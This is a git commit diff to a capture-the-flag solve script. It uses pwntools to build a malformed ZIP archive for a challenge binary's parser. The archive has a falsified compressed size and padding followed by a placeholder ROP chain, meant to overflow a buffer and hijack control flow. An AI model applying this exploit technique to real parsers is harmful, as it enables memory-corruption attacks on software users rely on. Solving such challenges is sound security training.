cbc72f660836c6d7f4923157560343b10de9c7f9
garywei944 <33930674+garywei944@users.noreply.github.com>
2022-04-02 15:31:17 -0400

    Successfully run rop on zip_parser

--- pwn/zip_parser/solve.py
+++ pwn/zip_parser/solve.py
@@ -1,5 +1,7 @@
 from pwn import *
 
+PH = b'A'
+
 elf = context.binary = ELF('./chal')
 libc = elf.libc
 
@@ -14,16 +16,72 @@ else:
 
 if args.GDB:
     gdb.attach(io, """
-        # b *main+174
         b *parse_data+522
         c
     """)
 
-io.send(b'00000128')
+# Make compressed data that contains ROP chain
+rop = ROP([elf])
+comp_data = PH * 0xa8
+# ROP chain start here
+rop.raw(rop.rdx)
+rop.raw(0x1234)
+comp_data += rop.chain()
 
-payload = b''
-payload += p32(0x06054b50)
+# Make zip file
+n = 1  # Number of entries/headers
 
-# can control header
+# 1. Make local file header
+comp_size = len(comp_data)
+len_file_name = 4
+len_extra_field = 0
+
+LFH = p32(0x04034b50)
+LFH += PH * 14
+LFH += p32(comp_size)  # Compressed size
+LFH += PH * 4
+LFH += p16(len_file_name)  # length file name
+LFH += p16(len_extra_field)  # length of extra field
+LFH += PH * len_file_name  # file name
+LFH += PH * len_extra_field  # extra field
+
+# 2. Make Central directory file header
+CDFH = p32(0x02014b50)
+CDFH += PH * 16
+CDFH += p32(0x40)  # Compressed size, HACKED
+CDFH += PH * 4
+CDFH += p16(len_file_name)  # File name length
+CDFH += p16(len_extra_field)  # Extra field length
+CDFH += PH * 10
+CDFH += p32(0)  # Relative offset of local file header. TODO: BUG
+CDFH += PH * len_file_name
+
+# 3. Make End of central directory record (EOCD)
+cd_size = len(CDFH)
+# Offset of start of central directory, relative to start of archive
+cd_offset = len(LFH) + len(comp_data)
+
+EOCD = p32(0x06054b50)  # End of central directory record
+EOCD += PH * 6
+# Total number of central directory records
+EOCD += p16(n)
+# Size of central directory (bytes)
+EOCD += p32(cd_size)
+# Offset of start of central directory, relative to start of archive
+EOCD += p32(cd_offset)
+EOCD += PH * 2
+
+zip_file = LFH + comp_data + CDFH + EOCD
+size_t = len(zip_file)
+
+payload = str(size_t).rjust(8, '0').encode()
+payload += zip_file
+
+print(payload)
+
+print(zip_file)
+print(len(zip_file))
+
+io.send(payload)
 
 io.interactive()
